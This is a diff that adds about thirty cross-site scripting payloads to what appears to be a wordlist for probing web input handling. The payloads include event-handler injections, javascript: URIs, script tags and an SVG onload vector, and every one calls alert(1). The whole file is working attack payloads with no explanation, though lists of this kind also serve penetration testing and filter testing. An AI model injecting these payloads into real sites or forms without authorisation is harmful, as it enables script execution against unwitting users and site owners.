@@ -1,1 +1,30 @@
+<a href="javascript:alert(1)">Click Me</a>
+<body onload=alert(1)>
+<b onmouseover=alert(1)>Hover Me</b>
+<details open ontoggle=alert(1)>
+<div oncontextmenu=alert(1)>Right Click</div>
+<embed src="javascript:alert(1)">
+<form><button formaction="javascript:alert(1)">Click
+<h1 ondblclick=alert(1)>Double Click</h1>
+<iframe src="javascript:alert(1)">
+<img src=x onerror=alert(1)>
+<input autofocus onfocus=alert(1)>
+<input oninvalid=alert(1) required autofocus>
+<input onpaste=alert(1) value="Paste Me">
+<input onsearch=alert(1)>
+<i onmousedown=alert(1)>Click Me</i>
+<isindex formaction="javascript:alert(1)" type=submit>
+javascript:alert(1)
+<marquee onstart=alert(1)>
+<math><x href="javascript:alert(1)">click
+<object data="javascript:alert(1)">
+<p onclick=alert(1)>Click Me</p>
+'"><script>alert(1)</script>
 <script>alert(1)</script>
+<script>alert('XSS')</script>
+<span oncopy=alert(1)>Copy Me</span>
+<style>@keyframes x{}</style><x style="animation-name:x" onanimationstart="alert(1)">
+<svg/onload=alert(1)>
+<textarea oncut=alert(1)>Cut Me</textarea>
+<u onmouseup=alert(1)>Click Me</u>
+<video><source onerror=alert(1)>
